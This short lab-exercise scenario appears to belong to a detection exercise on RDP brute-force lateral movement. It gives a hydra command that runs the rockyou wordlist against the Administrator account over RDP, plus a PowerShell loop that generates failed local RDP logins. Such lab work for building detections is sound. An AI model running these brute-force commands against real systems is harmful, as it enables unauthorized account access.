# 🛡️ Scenario 2: Lateral Movement via RDP Brute Force

## 🎯 Objective

Simulate and detect an RDP brute-force attack using stolen credentials—a common lateral movement technique by threat actors.

---

## 🧪 Attack Simulation

### ✅ From Kali Linux (Attacker):
```bash
hydra -t 4 -V -f -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<Windows_VM_IP>

```
                        or
for ($i = 0; $i -lt 5; $i++) {
    cmdkey /add:127.0.0.1 /user:fakeuser /pass:wrongpass
    mstsc /v:127.0.0.1
}
